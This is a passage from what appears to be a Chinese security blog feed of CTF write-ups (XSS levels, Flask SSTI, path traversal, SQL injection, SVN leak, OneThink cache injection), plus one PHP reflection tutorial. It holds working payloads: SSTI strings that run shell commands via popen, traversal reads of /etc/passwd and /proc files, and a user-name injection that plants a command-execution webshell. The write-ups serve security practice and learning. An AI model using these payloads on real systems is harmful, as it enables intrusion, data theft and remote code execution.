        <content type="html"><![CDATA[<p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/1b8f9194262029569eac25fe2fe0bcd.png" alt="1b8f9194262029569eac25fe2fe0bcd"></p><h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/e0418b3fd5c7ad3fceeea2e4c06b810.png" alt="e0418b3fd5c7ad3fceeea2e4c06b810"></p><h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/5c5d2b055ebae5b205942ee2992e8f6.png" alt="5c5d2b055ebae5b205942ee2992e8f6"></p><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/c83f511820e7176ac807755a8c70e38.png" alt="c83f511820e7176ac807755a8c70e38"></p><pre><code>var username = ‘’;alert('xss');//’;</code></pre><p>执行了alert</p><h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/8ba7d443774282ea8d3a3fc3b02e0f8.png" alt="8ba7d443774282ea8d3a3fc3b02e0f8"></p><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/5fc4cc6b8c4229b90a8300982c3d9d0.png" alt="5fc4cc6b8c4229b90a8300982c3d9d0"></p><p>单引号过滤了那用两个单引号</p><pre><code>?username='';alert('xss');//</code></pre><h3 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h3><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/5575961a262d9b8a3a4edbdcb07c2aa.png" alt="5575961a262d9b8a3a4edbdcb07c2aa"></p><p> 伪链接<br>javascript:alert(1)，浏览器会把javascript后面的那一段内容当做代码，直接在当前页面执行。<br>代码中接收jumpUrl作为跳转url</p><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/c32728d41d44039d18259fd6c54d679.png" alt="c32728d41d44039d18259fd6c54d679"></p><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/8a7efb956bb6903673491c4440755ab.png" alt="8a7efb956bb6903673491c4440755ab"></p><h3 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h3><pre><code>if(getQueryVariable('autosubmit') !== false){      var autoForm = document.getElementById('autoForm');      autoForm.action = (getQueryVariable('action') == false) ? location.href : getQueryVariable('action');      autoForm.submit();     }else{     }  function getQueryVariable(variable)  {         var query = window.location.search.substring(1);         var vars = query.split("&amp;");         for (var i=0;i&lt;vars.length;i++) {                 var pair = vars[i].split("=");                 if(pair[0] == variable){return pair[1];}         }         return(false);  }</code></pre><pre><code>if(getQueryVariable('autosubmit') !== false){</code></pre><pre><code>autoForm.action = (getQueryVariable('action') == false) ? location.href : getQueryVariable('action');</code></pre><pre><code>?autosubmit=1&amp;action=javascript:alert('xss')</code></pre><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/9c572777f083d7436d1b86620dcc3e8.png" alt="9c572777f083d7436d1b86620dcc3e8"></p><h3 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h3><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/a0e9bd5e0f3c3cc909188f4ea275954.png" alt="a0e9bd5e0f3c3cc909188f4ea275954"></p><p>AngularJS模板</p><p><a href="https://nosec.org/home/detail/4153.html">https://nosec.org/home/detail/4153.html</a></p><p>Angular的沙箱逃逸的方法</p><p><a href="https://xz.aliyun.com/t/4638">https://xz.aliyun.com/t/4638</a></p><pre><code>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}</code></pre><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/6321c24a559b806668ac38fd69e126c.png" alt="6321c24a559b806668ac38fd69e126c"></p><h3 id="通关"><a href="#通关" class="headerlink" title="通关"></a>通关</h3><p><img src="/2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/2d695b34ea95b30bf5bd66088f4c9bc.png" alt="2d695b34ea95b30bf5bd66088f4c9bc"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 《从0到1：CTFer成长之路》 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP:镜像反射</title>
      <link href="2021/05/15/php-jing-xiang-fan-she/"/>
      <url>2021/05/15/php-jing-xiang-fan-she/</url>
      
        <content type="html"><![CDATA[<h2 id="反射是什么？"><a href="#反射是什么？" class="headerlink" title="反射是什么？"></a>反射是什么？</h2><p>它是指在PHP运行状态中，扩展分析PHP程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取的信息以及动态调用对象的方法的功能称为反射API。反射是操纵面向对象范型中元模型的API，其功能十分强大，可帮助我们构建复杂，可扩展的应用。</p><p>其用途如：自动加载插件，自动生成文档，甚至可用来扩充PHP语言。</p><p>PHP反射api由若干类组成，可帮助我们用来访问程序的元数据或者同相关的注释交互。借助反射我们可以获取诸如类实现了那些方法，创建一个类的实例（不同于用new创建），调用一个方法（也不同于常规调用），传递参数，动态调用类的静态方法。<br> 反射api是PHP内建的OOP技术扩展，包括一些类，异常和接口，综合使用他们可用来帮助我们分析其它类，接口，方法，属性，方法和扩展。这些OOP扩展被称为反射。</p><p>平常我们用的比较多的是 ReflectionClass类 和 ReflectionMethod类</p><pre><code>&lt;?phpclass Person { /**  * For the sake of demonstration, we"re setting this private  */ private $_allowDynamicAttributes = false; /**  * type=primary_autoincrement  */ protected $id = 0; /**  * type=varchar length=255 null  */ protected $name; /**  * type=text null  */ protected $biography; public function getId() {  return $this-&gt;id; } public function setId($v) {  $this-&gt;id = $v; } public function getName() {  return $this-&gt;name; } public function setName($v) {  $this-&gt;name = $v; } public function getBiography() {  return $this-&gt;biography; } public function setBiography($v) {  $this-&gt;biography = $v; }}</code></pre><p>一、通过ReflectionClass，我们可以得到Person类的以下信息：</p><p>1.常量 Contants<br> 2.属性 Property Names<br> 3.方法 Method Names静态<br> 4.属性 Static Properties<br> 5.命名空间 Namespace<br> 6.Person类是否为final或者abstract<br> 7.Person类是否有某个方法</p><p>接下来反射它，只要把类名”Person”传递给ReflectionClass就可以了：</p><p>代码如下:</p><pre><code>$class = new ReflectionClass('Person'); // 建立 Person这个类的反射类  $instance  = $class-&gt;newInstanceArgs($args); // 相当于实例化Person 类 </code></pre><p>1）获取属性(Properties)：</p><p>代码如下:</p><pre><code>$properties = $class-&gt;getProperties();foreach ($properties as $property) { echo $property-&gt;getName() . "\n";}// 输出:// _allowDynamicAttributes// id// name// biography</code></pre><p>默认情况下，ReflectionClass会获取到所有的属性，private 和 protected的也可以。如果只想获取到private属性，就要额外传个参数：</p><p>代码如下:</p><pre><code>$private_properties = $class-&gt;getProperties(ReflectionProperty::IS_PRIVATE);</code></pre><p>可用参数列表：</p><p>代码如下:</p><pre><code>ReflectionProperty::IS_STATICReflectionProperty::IS_PUBLICReflectionProperty::IS_PROTECTEDReflectionProperty::IS_PRIVATE</code></pre><p>通过$property-&gt;getName()可以得到属性名。</p><p>2）获取注释：</p><p>通过getDocComment可以得到写给property的注释。</p><p>代码如下:</p><pre><code>foreach ($properties as $property) { if ($property-&gt;isProtected()) {  $docblock = $property-&gt;getDocComment();  preg_match('/ type\=([a-z_]*) /', $property-&gt;getDocComment(), $matches);  echo $matches[1] . "\n"; }}// Output:// primary_autoincrement// varchar// text</code></pre><p>3）获取类的方法</p><p>代码如下:</p><pre><code>getMethods()       来获取到类的所有methods。hasMethod(string)  是否存在某个方法getMethod(string)  获取方法</code></pre><p>4）执行类的方法：</p><p>代码如下:</p><pre><code>$instance-&gt;getName(); // 执行Person 里的方法getName// 或者：$method = $class-&gt;getmethod('getName'); // 获取Person 类中的getName方法$method-&gt;invoke($instance);    // 执行getName 方法// 或者：$method = $class-&gt;getmethod('setName'); // 获取Person 类中的setName方法$method-&gt;invokeArgs($instance, array('snsgou.com'));</code></pre><p>二、通过ReflectionMethod，我们可以得到Person类的某个方法的信息：</p><p>1.是否“public”、“protected”、“private” 、“static”类型<br> 2.方法的参数列表<br> 3.方法的参数个数<br> 4.反调用类的方法</p><p>代码如下:</p><pre><code>// 执行detail方法$method = new ReflectionMethod('Person', 'test');if ($method-&gt;isPublic() &amp;&amp; !$method-&gt;isStatic()) { echo 'Action is right';}echo $method-&gt;getNumberOfParameters(); // 参数个数echo $method-&gt;getParameters(); // 参数对象数组</code></pre><p><a href="https://blog.csdn.net/u013416034/article/details/105933637/">https://blog.csdn.net/u013416034/article/details/105933637/</a></p><p><a href="https://blog.csdn.net/luyaran/article/details/84339363">https://blog.csdn.net/luyaran/article/details/84339363</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask-ssti模板注入</title>
      <link href="2021/05/14/flask-ssti-mo-ban-zhu-ru/"/>
      <url>2021/05/14/flask-ssti-mo-ban-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h3 id="ssti漏洞成因"><a href="#ssti漏洞成因" class="headerlink" title="ssti漏洞成因"></a>ssti漏洞成因</h3><p>ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade  velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。本文着重对flask模板注入进行浅析。</p><h2 id="flask漏洞成因"><a href="#flask漏洞成因" class="headerlink" title="flask漏洞成因"></a>flask漏洞成因</h2><p>为什么说我们上面的代码会有漏洞呢，其实对于代码功底比较深的师傅，是不会存在ssti漏洞的，被一些偷懒的师傅简化了代码，所以造成了ssti。上面的代码我们本可以写成类似如下的形式。</p><pre><code>&lt;html&gt;  &lt;head&gt;    &lt;title&gt;{{title}} - 小猪佩奇&lt;/title&gt;  &lt;/head&gt; &lt;body&gt;      &lt;h1&gt;Hello, {{user.name}}!&lt;/h1&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>里面有两个参数需要我们渲染，user.name，以及title</p><p>我们在app.py文件里进行渲染。</p><pre><code>@app.route('/')@app.route('/index')#我们访问/或者/index都会跳转def index():   return render_template("index.html",title='Home',user=request.args.get("key"))</code></pre><p>也就是说，两种代码的形式是，一种当字符串来渲染并且使用了%(request.url)，另一种规范使用index.html渲染文件。我们漏洞代码使用了render_template_string函数，而如果我们使用render_template函数，将变量传入进去，现在即使我们写成了request，我们可以在url里写自己想要的恶意代码</p><pre><code>{{}}```主要就是这句：```{{"".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()}}</code></pre><h2 id="ctf中的一些绕过tips"><a href="#ctf中的一些绕过tips" class="headerlink" title="ctf中的一些绕过tips"></a>ctf中的一些绕过tips</h2><p>没什么系统思路。就是不断挖掘类研究官方文档以及各种能够利用的姿势。这里从最简单的绕过说起。</p><p>1.过滤[]等括号</p><pre><code>使用gititem绕过。如原poc {{"".**class**.**bases**[0]}}</code></pre><pre><code>绕过后{{"".**class**.**bases**.**getitem**(0)}}</code></pre><p>2.过滤了subclasses，拼凑法</p><pre><code>原poc{{"".**class**.**bases**[0].**subclasses**()}}</code></pre><pre><code>绕过 {{"".**class**.**bases**[0]['**subcla'+'sses**'](https://xz.aliyun.com/t/3679)}}</code></pre><p>3.过滤class</p><p>使用session</p><pre><code>poc {{session['**cla'+'ss**'].**bases**[0].**bases**[0].**bases**[0].**bases**[0].**subclasses**()[118]}}</code></pre><p>多个bases[0]是因为一直在向上找object类。使用mro就会很方便</p><p>收藏的一些poc</p><pre><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls'){{request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]['__in'+'it__']['__'+'glo'+'bal'+'s__']['__bu'+'iltins__']['ev'+'al']('__im'+'port__("os").po'+'pen("ca"+"t a.php").re'+'ad()')}}</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181221165627-4d167624-04fe-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221165627-4d167624-04fe-1.png" alt="img"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《从0到1：CTFer成长之路》:Web-afr_3</title>
      <link href="2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/"/>
      <url>2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/</url>
      
        <content type="html"><![CDATA[<pre><code>article?name=../../../etc/passwd</code></pre><p><img src="/2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/dfafa81734822b8a4dead9370465497.png" alt="dfafa81734822b8a4dead9370465497"></p><pre><code>article?name=../../../flag</code></pre><p><img src="/2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/2c040ca57f1fa6cd98f6903789c6657.png" alt="2c040ca57f1fa6cd98f6903789c6657"></p><h4 id="Linux内核源代码情景分析-特殊文件系统-proc-对-proc-self-cwd的访问"><a href="#Linux内核源代码情景分析-特殊文件系统-proc-对-proc-self-cwd的访问" class="headerlink" title="Linux内核源代码情景分析-特殊文件系统/proc-对/proc/self/cwd的访问"></a>Linux内核源代码情景分析-特殊文件系统/proc-对/proc/self/cwd的访问</h4><ol><li><p>/proc/sched_debug # 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用</p></li><li><p>/proc/mounts # 挂载的文件系统列表</p></li><li><p>/proc/net/arp # arp表，可以获得内网其他机器的地址</p></li><li><p>/proc/net/route # 路由表信息</p></li><li><p>/proc/net/tcp and /proc/net/udp # 活动连接的信息</p></li><li><p>/proc/net/fib_trie # 路由缓存</p></li><li><p>/proc/version  # 内核版本</p></li><li><p>/proc/[PID]/cmdline # 可能包含有用的路径信息</p></li><li><p>/proc/[PID]/environ #  程序运行的环境变量信息，可以用来包含getshell</p></li><li><p>/proc/[PID]/cwd     # 当前进程的工作目录</p></li><li><p>/proc/[PID]/fd/[#] # 访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log</p><pre><code>article?name=../../../proc/self/cmdline</code></pre></li></ol><p><img src="/2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/8e57c316434afe29a6b114b857f3fe9.png" alt="8e57c316434afe29a6b114b857f3fe9"></p><pre><code>article?name=../../../proc/self/cwd/server.py</code></pre><p><img src="/2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/b0ea292d99ec5dca2dcc57cdc384634.png" alt="b0ea292d99ec5dca2dcc57cdc384634"></p><p>看到代码了：</p><pre><code>#!/usr/bin/pythonimport osfrom flask import (Flask, render_template, request, url_for, redirect, session, render_template_string)from flask_session import Sessionapp = Flask(__name__)execfile('flag.py')#execfile() 函数可以用来执行一个文件。execfile('key.py')FLAG = flagapp.secret_key = key @ app.route("/n1page", methods=["GET", "POST"])def n1page():    if request.method != "POST":        return redirect(url_for("index"))    n1code = request.form.get("n1code") or None    if n1code is not None: n1code = n1code.replace(".", "").replace("_", "").replace("{", "").replace("}", "")if "n1code" not in session or session['n1code'] is None: session['n1code'] = n1codetemplate = Noneif session[    'n1code'] is not None: template = '''&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class="row&gt; &lt;div class="col-md-6 col-md-offset-3 center"&gt; Hello : %s, why you don't look at our &lt;a href='/article?name=article'&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; ''' %session['n1code']session['n1code'] = Nonereturn render_template_string(template) @ app.route("/", methods=["GET"])def index(): return render_template("main.html") @ app.route('/article', methods=['GET'])def article(): error = 0if 'name' in request.args:    page = request.args.get('name') else:    page = 'article'if page.find('flag') &gt;= 0: page = 'notallowed.txt'try:    template = open('/home/nu11111111l/articles/{}'.format(page)).read() except Exception as e:    template = ereturn render_template('article.html', template=template)if __name__ == "__main__": app.run(host='0.0.0.0', debug=False)</code></pre><pre><code>flag在flag.py(flag被过滤)flask的appkey在key.py源码里面存在ssti，前提是可以伪造flask的session</code></pre><p>ssti注入：</p><pre><code>{'n1code': '{{\'\'.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\'os\'].popen(\'cat flag.py\').read()}}'</code></pre><p><img src="/2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/e5274968efa9a4310fbf7d679dab5ae.png" alt="e5274968efa9a4310fbf7d679dab5ae"></p><p>加密后</p><p>cookies:</p><pre><code>session=.eJwdikEKgCAQAL8SXlYvQl2CviKxbGoRmCtZhxD_nnUbZqaI2Ft2XkyiFACNaAPljNjoOBnRDHPDfC-_961IZcb-k3vcr3_cAi8UWjLAGWadOPkowdLVrYE2nR5Q-vTkpKpV1BcrHygP.X7VhLg.TjoSPMRjbzbRBNeGnJ2EtXbpNCM</code></pre><p>flag：</p><pre><code>n1book{afr_3_solved}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 《从0到1：CTFer成长之路》 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web-Flask_FileUpload</title>
      <link href="2021/05/13/bugku-web-flask-fileupload/"/>
      <url>2021/05/13/bugku-web-flask-fileupload/</url>
      
        <content type="html"><![CDATA[<p>F12看到可以上传py脚本，</p><p>上传jpg格式的</p><p>py脚本：</p><pre><code>import osos.system('cat /flag')</code></pre><p>在源代码中查看flag</p><p><img src="/2021/05/13/bugku-web-flask-fileupload/c4db0ed7edb369e6c5c922264a3fea6.png" alt="c4db0ed7edb369e6c5c922264a3fea6"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《从0到1：CTFer成长之路》:Web-afr_1</title>
      <link href="2021/05/13/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-1/"/>
      <url>2021/05/13/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-1/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/13/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-1/b7901b4aa9628d957db9d6cafe1ed4a.png" alt="b7901b4aa9628d957db9d6cafe1ed4a"></p><p><img src="/2021/05/13/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-1/227ff2db7a1b0c6b3fd4f6d4bc2d656.png" alt="227ff2db7a1b0c6b3fd4f6d4bc2d656"></p><pre><code>?p=php://filter/read=convert.base64-encode/resource=flag</code></pre><p><img src="/2021/05/13/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-1/e4b4ff7ef7c1729762137bfe7e85344.png" alt="e4b4ff7ef7c1729762137bfe7e85344"></p><p><img src="/2021/05/13/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-1/cfb6513f5601da38e436d6ef44065bc.png" alt="cfb6513f5601da38e436d6ef44065bc"></p><pre><code>n1book{afr_1_solved}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 《从0到1：CTFer成长之路》 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web18-秋名山司机</title>
      <link href="2021/05/12/bugku-web18-qiu-ming-shan-si-ji/"/>
      <url>2021/05/12/bugku-web18-qiu-ming-shan-si-ji/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/12/bugku-web18-qiu-ming-shan-si-ji/bdaaaa4f138f0bda35a9995faec2961.png" alt="bdaaaa4f138f0bda35a9995faec2961"></p><p><img src="/2021/05/12/bugku-web18-qiu-ming-shan-si-ji/5e0d83e24d8da06c267472732de8ed5.png" alt="5e0d83e24d8da06c267472732de8ed5"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web-Simple_SSTI_2</title>
      <link href="2021/05/11/bugku-web-simple-ssti-2/"/>
      <url>2021/05/11/bugku-web-simple-ssti-2/</url>
      
        <content type="html"><![CDATA[<pre><code>?flag={{%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20../%27).read()%20}}</code></pre><pre><code>?flag={{%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20../app/%27).read()%20}}</code></pre><pre><code>?flag={{%20config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20../app/flag%27).read()%20}}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web-game1</title>
      <link href="2021/05/10/bugku-web-game1/"/>
      <url>2021/05/10/bugku-web-game1/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/10/bugku-web-game1/ab49a807989a44b6ab79af366fd02be.png" alt="ab49a807989a44b6ab79af366fd02be"></p><p><img src="/2021/05/10/bugku-web-game1/34a8b6eac9f7577510e21cd7f49a906.png" alt="34a8b6eac9f7577510e21cd7f49a906"></p><p>抓包和查看网络中的sign都可以找到这个牛马</p><p>其中</p><pre><code>sign=zMMjU===</code></pre><p><img src="/2021/05/10/bugku-web-game1/3d130a54231bdb560c94b03704976ad.png" alt="3d130a54231bdb560c94b03704976ad"></p><p>MjU=为25的base64</p><p>所以我们吧成绩改为999999的base64：OTk5OTk5</p><pre><code>sign=zMOTk5OTk5==</code></pre><p><img src="/2021/05/10/bugku-web-game1/698ef3d8046503f3130672e7c6519e7.png" alt="698ef3d8046503f3130672e7c6519e7"></p><p>拿到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋:Web-SomeWords</title>
      <link href="2021/05/09/i-chun-qiu-web-somewords/"/>
      <url>2021/05/09/i-chun-qiu-web-somewords/</url>
      
        <content type="html"><![CDATA[<pre><code>?id=updatexml(1,concat(0x7e,(select f14g from f14g),0x7e),1)</code></pre><p><img src="/2021/05/09/i-chun-qiu-web-somewords/963b46e85a453e6499edcb91657d809.png" alt="963b46e85a453e6499edcb91657d809"></p><pre><code>?id=updatexml(1,concat(reverse((select f14g from f14g))),1)</code></pre><p><img src="/2021/05/09/i-chun-qiu-web-somewords/b0bd2a2425baa0205d9c8c18c6aeee6.png" alt="b0bd2a2425baa0205d9c8c18c6aeee6"></p>]]></content>
      
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋:Web-upload(svn泄露)</title>
      <link href="2021/05/08/i-chun-qiu-web-upload-svn-xie-lu/"/>
      <url>2021/05/08/i-chun-qiu-web-upload-svn-xie-lu/</url>
      
        <content type="html"><![CDATA[<h2 id="SVN源码泄露漏洞"><a href="#SVN源码泄露漏洞" class="headerlink" title="SVN源码泄露漏洞"></a>SVN源码泄露漏洞</h2><p><a href="https://blog.csdn.net/qq_36869808/article/details/88847364">https://blog.csdn.net/qq_36869808/article/details/88847364</a></p><p><strong>概要</strong>：SVN是源代码本本管理软件。使用SVN管理本地代码过程中，会生成一个名为.svn的隐藏文件夹，其中包含重要的源码信息。<br> <strong>出现原因</strong>：网站管理员在发布代码时，没有使用导出功能，直接进行复制粘贴。<br> <strong>漏洞例子</strong>：xxxx/.svn/entries</p><p>关于svn的原理之前看过很多个，但是大多就是造成泄露的原因，无非就是人为粗心导致的。</p><p>关于svn利用分两个版本一个版本是svn&gt;1.6，还有一个是svn&lt;1.6</p><p>svn&gt;1.6,文件名会被hash，然后再按照文件名对应hash的方式存到wc.db中,就是个sqlite数据库。最后我们按照名称遍历下载即可。</p><p>svn&lt;1.6,文件会先去读取entries文件的中的目录结构,因为默认文件名都是直接明文存的。</p><h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><pre><code>import base64,requestsdef main():    a = requests.session()    b = a.get("http://549bc9defbb74fc5bf83a53d5f194bccf641983365c0447b.changame.ichunqiu.com/")    key1 = b.headers["flag"]    c = base64.b64decode(key1)    d = str(c).split(':')    key = base64.b64decode(d[1])    body = {"ichunqiu":key}    f = a.post("http://549bc9defbb74fc5bf83a53d5f194bccf641983365c0447b.changame.ichunqiu.com/",data=body)    print (f.text)if __name__ == '__main__':    main()</code></pre><p>字符串的意思是提示我们一个路径，不管了，访问之</p><p>Url/3712901a08bb58557943ca31f3487b7d</p><p>进去是一个普普通通的跳转界面，看源码没什么特别的</p><p>点按钮进入下一界面</p><p><img src="https://img2018.cnblogs.com/blog/1712230/201909/1712230-20190904230807381-697408493.png" alt="img"></p><p>就是一个登录界面了</p><p>svn泄露</p><p>访问</p><pre><code>/3712901a08bb58557943ca31f3487b7d/.svn/wc.db</code></pre><p>解开username是8638d5263ab0d3face193725c23ce095</p><p>3712901a08bb58557943ca31f3487b7d/7815696ecbf1c96e6894b779456d330e.php</p><p><img src="/2021/05/08/i-chun-qiu-web-upload-svn-xie-lu/5f82878beeb1d456ce6c635f6f709d2.png" alt="5f82878beeb1d456ce6c635f6f709d2"></p>]]></content>
      
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋:Web-时间</title>
      <link href="2021/05/07/i-chun-qiu-web-shi-jian/"/>
      <url>2021/05/07/i-chun-qiu-web-shi-jian/</url>
      
        <content type="html"><![CDATA[<pre><code>&lt;?php header("content-type:text/html;charset=utf-8");'天下武功唯快不破';setcookie('token','hello');   show_source(__FILE__);if ($_COOKIE['token']=='hello'){        $txt = file_get_contents('flag.php');      $filename = 'u/'.md5(mt_rand(1,1000)).'.txt';   file_put_contents($filename,$txt);  sleep(10);  unlink($filename);}</code></pre><p>访问网站，在10秒里会生成一个目录，flag会写在里面。但是10秒之后这个目录会被删除。首先我们要生成这些些目录，然后拿着这些目录当成字典爆破</p><p>十秒后网页就会变成这样：</p><p><img src="/2021/05/07/i-chun-qiu-web-shi-jian/7926171694d823f096c0abc383d4f10.png" alt="7926171694d823f096c0abc383d4f10"></p><pre><code>import hashlibimport requestsfile = open("data.txt",'w+')for i in range(1,1001):  m = hashlib.md5()  m.update(str(i).encode())  mid = m.hexdigest()  url = 'u/'+mid+'.txt'  file.write(url+'\n')file.close()</code></pre><p>生成的data.txt粘贴到御剑配置目录中</p><p>十秒内添加url扫描</p><p><img src="/2021/05/07/i-chun-qiu-web-shi-jian/71af1f0c098871c29091abff8fc59ce-1620200164109.png" alt="71af1f0c098871c29091abff8fc59ce"></p><p><img src="/2021/05/07/i-chun-qiu-web-shi-jian/7258677249d5a299e5280c858e74163-1620200170576.png" alt="7258677249d5a299e5280c858e74163"></p>]]></content>
      
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋:Web-OneThink</title>
      <link href="2021/05/06/i-chun-qiu-web-onethink/"/>
      <url>2021/05/06/i-chun-qiu-web-onethink/</url>
      
        <content type="html"><![CDATA[<h2 id="OneThink1-0文件缓存漏洞利用"><a href="#OneThink1-0文件缓存漏洞利用" class="headerlink" title="OneThink1.0文件缓存漏洞利用"></a>OneThink1.0文件缓存漏洞利用</h2><p>首先利用该漏洞尝试执行phpinfo。<br> 注册用户<code>%0aphpinfo();#</code><br> 其中<code>%0a</code>是让用户名在缓存文件中以新的一行开始（前面分析代码时提到<code>$data</code>会和前面的<code>&lt;?phpn//</code>拼接，这里是防止被<code>//</code>注释），而#注释符则让之后序列化产生的字符失效，防止影响函数执行。</p><p>提交注册，通过Burpsuit进行拦截，这里将<code>%0a</code>进行url编码解码，成为换行符</p><p>将数据包放行后，用户注册成功，进入登录界面进行登录：</p><p>同样进行抓包拦截，修改%0a后放行：</p><p>payload用户登录成功，接下来访问缓存页面<br> 发现成功执行phpinfo()！</p><p>在本地搭建同样环境后测试，发现缓存文件中内容如下：</p><p>同样的方法向缓存文件中写入代码执行：</p><pre class=" language-v"><code class="language-v">%0a$a=$_GET[a];#%0asystem($a);#</code></pre><p>参考:<a href="https://www.anquanke.com/post/id/152584">https://www.anquanke.com/post/id/152584</a></p><h2 id="实例-i春秋-Web-OneThink"><a href="#实例-i春秋-Web-OneThink" class="headerlink" title="实例:i春秋:Web-OneThink"></a>实例:i春秋:Web-OneThink</h2><ol><li>换行符的url编码是%0A；</li><li>onethink是一个CMS平台；</li><li>oneThink1.0存在一个把用户名缓存下来的漏洞，可以修改用户名为php代码进行执行；</li><li>phpinfo(); 输出php信息</li><li><code>system($_GET[cmd]);</code>，能执行传入的cmd命令，并且回显在响应中；</li></ol><p>注册用户名会被缓存进一个文件，然后注册一个一句话木马做用户名，访问缓存文件，就能成。</p><p>两个账号：</p><pre><code>%0a$a=$_GET[a];//  %0aecho  `$a`;//     #(%0a是换行符的urlencode)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋:Web-zone</title>
